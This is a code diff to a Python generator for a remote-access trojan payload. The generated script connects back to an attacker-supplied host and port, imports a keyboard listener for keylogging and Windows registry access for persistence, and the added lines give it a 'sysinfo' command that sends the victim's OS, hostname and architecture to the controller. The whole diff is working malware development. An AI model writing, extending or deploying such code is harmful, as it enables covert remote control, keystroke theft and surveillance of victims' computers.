@@ -5,7 +5,7 @@ def generate_payload(host,port,file_name):
 from pynput.keyboard import Key, Listener
 from os.path import realpath
 from winreg import *
-import socket,os,subprocess,pyautogui,time,requests,numpy,idna
+import socket,os,subprocess,pyautogui,time,requests,numpy,idna,platform
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.connect(('"""+host+"""', """+port+"""))
 keyLog = str()
@@ -97,7 +97,16 @@ while True:
         if code != None:
             s.send('Error!'.encode())
         else:
-            s.send('Persistence execute with success!'.encode())"""
+            s.send('Persistence execute with success!'.encode())
+    if conn == 'sysinfo':
+        OS = '{} {} ({})'.format(platform.system(),platform.release(),platform.version())
+        NAME = platform.node()
+        if '64' in platform.machine():
+            ARCH = 'x64'
+        else:
+            ARCH = 'x86'
+        sysinfo = 'Name          :: {}\\nOS            :: {}\\nArchitecture  :: {}'.format(NAME,OS,ARCH)
+        s.send(sysinfo.encode('Latin_1'))"""
     
     with open(file_name,'w') as payload_file:
         payload_file.write(payload)
